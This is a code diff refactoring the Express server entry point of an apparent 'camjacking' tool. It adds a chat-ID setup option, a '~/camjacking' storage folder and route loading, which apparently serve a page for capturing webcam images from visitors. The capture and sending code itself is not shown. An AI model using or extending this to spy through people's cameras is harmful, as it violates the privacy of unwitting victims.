@@ -6,60 +6,68 @@
  * @author karthikeyan V (karthithehacker) <https://karthithehacker.com>
  */
 
-
-//lib and includes section
 const express = require("express");
 const app = express();
 const path = require('path');
-const fs = require("fs");
+const fs = require("fs-extra");
 const help = require('./includes/help');
 const bodyParser = require('body-parser');
+const conf = require('./includes/config');
 const os = require("os");
 const yargs = require('yargs/yargs');
-const { hideBin } = require('yargs/helpers')
-// get the home directory path
+const { hideBin } = require('yargs/helpers');
+
 const homeDir = os.homedir();
-const argv = yargs(hideBin(process.argv)).argv 
+const argv = yargs(hideBin(process.argv)).argv;
 
-if( argv.h == true ){
-   help.helpintro();
-   help.helpmenu();
-    return; 
-}
-var port
-if(argv.p == null || argv.p == true ){
-   
-    if(argv.port == null || argv.port == true){
+const port = argv.p || argv.port;
+
+(async () => {
+    if (argv.h) {
         help.helpintro();
-        return; 
+        help.helpmenu();
+        return;
     }
-}
-if(argv.p){
-    port = argv.p
-    app.listen(argv.p);
-    console.log()
-}
-if(argv.port){
-    port = argv.port
-    app.listen(argv.port);
-    console.log()
-}
 
+    if (argv.c) {
+        help.helpintro();
+        const checkResult = await conf.checkId();
+        const chatid = await conf.getChatId()
+        if (checkResult === 'Exist') {
+            console.log(`Chat ID Exists ===> ${chatid}`);
 
-fs.access(homeDir+"/camjacking", function (err) {
-  if (err) {
-    fs.mkdir(homeDir+"/camjacking", { recursive: true }, function (err) {
-        if (err) throw err;
+            return;
+        } else {
+            conf.newChatId(argv.c)
+
+        }
+    }
+
+    if (!argv.c && !port) {
+        help.helpintro();
+        help.helpmenu();
+        return;
+    }
+
+    if (port) {
+        app.listen(port, () => {
+            help.helpintro();
+            console.log(`Server running on port ${port}`);
+            console.log(`URL=====> http://localhost:${port}`);
         });
-  } else {
-   
-  }
-});
-help.helpintro();
-console.log("URL=====> http://localhost:"+port)
-app.set('views', path.join(__dirname, 'views'));
-app.set('view-engine','ejs');
-app.use(bodyParser.json({limit: "50mb"}));
-app.use(bodyParser.urlencoded({limit: "50mb", extended: true, parameterLimit:50000}));
-app.use(express.static(__dirname + '/Assets/'));
-app.use(require('./includes/route'));
+    }
+
+    try {
+        await fs.access(path.join(homeDir, "camjacking"));
+    } catch (err) {
+        await fs.mkdir(path.join(homeDir, "camjacking"), { recursive: true });
+    }
+
+    
+    app.set('views', path.join(__dirname, 'views'));
+    app.set('view engine', 'ejs');
+    app.use(bodyParser.json({ limit: "50mb" }));
+    app.use(bodyParser.urlencoded({ limit: "50mb", extended: true, parameterLimit: 50000 }));
+    app.use(express.static(path.join(__dirname, 'Assets')));
+    app.use(require('./includes/route'));
+})();
